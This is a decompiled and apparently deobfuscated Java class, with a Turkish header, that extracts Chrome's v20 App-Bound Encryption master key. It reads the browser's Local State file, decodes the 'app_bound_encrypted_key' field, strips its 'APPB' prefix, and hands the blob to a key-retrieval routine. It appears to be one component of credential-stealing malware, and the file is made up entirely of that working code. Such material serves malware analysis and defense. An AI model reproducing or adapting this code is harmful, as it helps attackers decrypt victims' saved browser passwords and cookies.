/*\n * ========================================\n * DEOBFUSCATED: AbeKeyExtractor.java\n * Original: c/h.java\n * ----------------------------------------\n * Chrome v20 App-Bound Encryption key çıkarıcı\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.Log;
import c.o;
import c.r;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;
import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

public final class h {
    private static final byte[] a = new byte[]{65, 80, 80, 66};
    private static final ConcurrentHashMap<String, byte[]> b = new ConcurrentHashMap();

    private h() {
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static byte[] getMasterKeyV20(String string, String string2) {
        if (string == null || string.isEmpty() || string2 == null || string2.isEmpty()) {
            return null;
        }
        Class<h> clazz = h.class;
        Class<h> clazz2 = h.class;
        synchronized (h.class) {
            // ** MonitorExit[var3_3] (shouldn't be in output)
            return h.getMasterKeyV20Locked(string, string2);
        }
    }

    private static byte[] getMasterKeyV20Locked(String string, String string2) {
        if (string == null || string.isEmpty() || string2 == null || string2.isEmpty()) {
            return null;
        }
        byte[] byArray = b.get(string2);
        if (byArray != null) {
            return Arrays.copyOf(byArray, byArray.length);
        }
        try {
            byte[] byArray2 = h.loadEncryptedBlob(string2);
            if (byArray2 == null) {
                return null;
            }
            try {
                byte[] byArray3 = o.retrieveMasterKey(string, byArray2);
                if (byArray3 != null && byArray3.length == 32) {
                    b.put(string2, Arrays.copyOf(byArray3, byArray3.length));
                    return Arrays.copyOf(byArray3, byArray3.length);
                }
            }
            catch (Exception exception) {
                try {
                    Log.agent("abe v20 key fail browser=" + string + " err=" + exception.getClass().getSimpleName() + (String)(exception.getMessage() != null ? ":" + exception.getMessage() : ""));
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
            }
            return null;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static void clearCache() {
        b.clear();
    }

    private static byte[] loadEncryptedBlob(String string) throws Exception {
        JSONObject jSONObject;
        File file = new File(string);
        if (!file.isFile()) {
            return null;
        }
        String string2 = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
        if (string2 != null && !string2.isEmpty() && string2.charAt(0) == '\ufeff') {
            string2 = string2.substring(1);
        }
        if (!(jSONObject = new JSONObject(string2)).has("os_crypt" /* r.osc() */)) {
            return null;
        }
        JSONObject jSONObject2 = jSONObject.getJSONObject("os_crypt" /* r.osc() */);
        if (!jSONObject2.has("app_bound_encrypted_key" /* r.abek() */)) {
            return null;
        }
        byte[] byArray = Base64.getDecoder().decode(jSONObject2.getString("app_bound_encrypted_key" /* r.abek() */));
        if (byArray.length <= a.length) {
            return null;
        }
        for (int i2 = 0; i2 < a.length; ++i2) {
            if (byArray[i2] == a[i2]) continue;
            return null;
        }
        return Arrays.copyOfRange(byArray, a.length, byArray.length);
    }
}

